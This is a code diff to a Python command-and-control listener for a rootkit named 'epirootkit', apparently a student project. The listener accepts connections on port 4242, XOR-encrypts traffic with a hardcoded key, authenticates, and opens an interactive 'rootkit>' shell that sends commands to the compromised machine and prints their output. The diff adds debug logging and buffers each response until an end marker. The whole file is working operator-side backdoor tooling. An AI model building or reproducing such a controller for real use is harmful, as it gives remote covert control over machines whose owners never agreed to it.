@@ -1,7 +1,8 @@
 import socket
 import sys
+import time
 
-# Make sure to use string key, not bytes, to match the rootkit
+DEBUG = True
 KEY = "epirootkit"
 HOST = "0.0.0.0"
 PORT = 4242
@@ -16,35 +17,59 @@ def xor(data: bytes) -> bytes:
         result.append(b ^ ord(KEY[i % len(KEY)]))
     return bytes(result)
 
+def debug_print(msg: str, data: bytes = None):
+    if DEBUG:
+        print(f"[DEBUG] {msg}")
+        if data:
+            print(f"[DEBUG] Raw data: {data}")
+            print(f"[DEBUG] Hex: {data.hex()}")
+
+def receive_response(client):
+    """Receive and accumulate response until --EOF-- marker"""
+    response = bytearray()
+    while True:
+        chunk = client.recv(2048)
+        if not chunk:
+            break
+        response.extend(chunk)
+        decrypted = xor(response).decode('ascii', errors='ignore')
+        if '--EOF--' in decrypted:
+            break
+        time.sleep(0.1)  # Small delay to prevent CPU spinning
+    return bytes(response)
+
 def handle_client(client):
     try:
-        # Envoyer le mot de passe chiffré
+        # Send encrypted password
         password = b"epirootkit\n"
         encrypted_pass = xor(password)
+        debug_print("Sending encrypted password", encrypted_pass)
         client.sendall(encrypted_pass)
 
-        # Recevoir et déchiffrer la réponse
-        auth_response_encrypted = client.recv(2048)
+        # Receive and decrypt auth response
+        auth_response_encrypted = receive_response(client)
         if not auth_response_encrypted:
             print("No response received")
             return
 
         auth_response = xor(auth_response_encrypted)
-        try:
-            auth_response = auth_response.decode('ascii')
-        except UnicodeDecodeError:
-            print("Warning: Received corrupted response")
-            auth_response = auth_response.decode('ascii', errors='ignore')
+        debug_print("Received encrypted auth response", auth_response_encrypted)
+        debug_print("Decrypted auth response", auth_response)
 
-        print("--- AUTH ---")
-        print(auth_response.strip())
-        print("------------\n")
+        try:
+            auth_response = auth_response.decode('ascii', errors='ignore')
+            print("--- AUTH ---")
+            print(auth_response.strip())
+            print("------------\n")
+        except UnicodeDecodeError:
+            print("Warning: Received corrupted auth response")
+            return
 
         if "FAIL" in auth_response:
             print("Authentication failed. Exiting.")
             return
 
-        # Si l'authentification réussit, on continue avec le shell
+        # Interactive shell loop
         while True:
             try:
                 cmd = input("rootkit> ").strip()
@@ -53,22 +78,24 @@ def handle_client(client):
                 if cmd.lower() == "exit":
                     break
 
-                # Chiffrer et envoyer la commande
+                # Send encrypted command
                 cmd_bytes = (cmd + "\n").encode('ascii')
                 encrypted_cmd = xor(cmd_bytes)
+                debug_print(f"Sending encrypted command: {cmd}", encrypted_cmd)
                 client.sendall(encrypted_cmd)
 
-                # Recevoir et déchiffrer la réponse
-                response_encrypted = client.recv(2048)
+                # Receive and decrypt response
+                response_encrypted = receive_response(client)
                 if response_encrypted:
                     response = xor(response_encrypted)
+                    debug_print("Received encrypted response", response_encrypted)
+                    debug_print("Decrypted response", response)
+
                     try:
-                        response = response.decode('ascii')
-                        print(response.strip())
+                        response = response.decode('ascii', errors='ignore')
+                        print(response.strip().replace('--EOF--', ''))
                     except UnicodeDecodeError:
                         print("Warning: Received corrupted response")
-                        response = response.decode('ascii', errors='ignore')
-                        print(response.strip())
 
             except KeyboardInterrupt:
                 break
